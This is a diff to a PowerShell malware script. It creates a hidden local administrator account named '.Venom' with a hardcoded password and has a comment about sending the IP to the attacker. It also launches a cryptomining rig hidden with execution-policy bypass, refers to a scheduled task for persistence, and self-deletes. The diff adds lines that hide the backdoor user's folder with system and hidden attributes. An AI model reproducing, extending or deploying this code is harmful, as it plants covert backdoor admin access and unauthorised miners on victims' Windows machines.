@@ -16,7 +16,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     # Create a new local admin account
     $username = ".Venom"
     $password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
-    New-LocalUser $username -Password $password -FullName "Venom" -Description "Local admin account created via PowerShell"
+    New-LocalUser $username -Password $password -FullName ".Venom" -Description "Local admin account created via PowerShell"
     Add-LocalGroupMember -Group "Administrators" -Member $username
 }
 
@@ -29,8 +29,8 @@ $initial_dir = Get-Location
 
 
 # create admin user
-#$NewLocalAdmin = "Venom"
-#$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
+#$NewLocalAdmin = ".Venom"
+#$Password = (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
 #Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # send ip to attacker
@@ -115,8 +115,9 @@ Write-Host "Scheduled task created successfully. Your CMD file will now run at s
 # start rig
 powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
 
-pause
 # hide venom user
+cd C:\Users
+attrib +h +s +r .Venom
 
 # self delete
 cd $initial_dir
